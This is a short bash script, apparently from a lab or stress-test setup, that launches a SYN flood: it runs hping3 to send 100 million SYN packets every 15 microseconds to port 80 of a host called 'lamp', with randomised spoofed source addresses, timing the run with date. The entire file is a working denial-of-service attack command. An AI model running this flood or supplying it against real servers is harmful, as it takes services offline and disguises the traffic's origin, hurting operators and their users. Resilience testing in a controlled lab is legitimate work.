#!/bin/bash
date
echo "Starting SYN Flood: hping3 -c 100000000 -S -i u15 -p 80 --rand-source -I eth1 server1"
hping3 -c 100000000 -S -i u15 -p 80 --rand-source -I eth1 lamp
date
